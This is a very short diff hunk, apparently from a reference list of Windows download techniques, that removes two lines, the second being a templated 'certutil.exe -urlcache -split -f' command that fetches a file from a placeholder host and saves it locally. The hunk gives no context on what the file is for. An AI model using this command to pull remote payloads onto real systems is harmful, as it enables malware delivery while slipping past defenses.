@@ -1,2 +1,0 @@
-certutil.
-certutil.exe -urlcache -split -f http/s://{host}/{file} {filename}
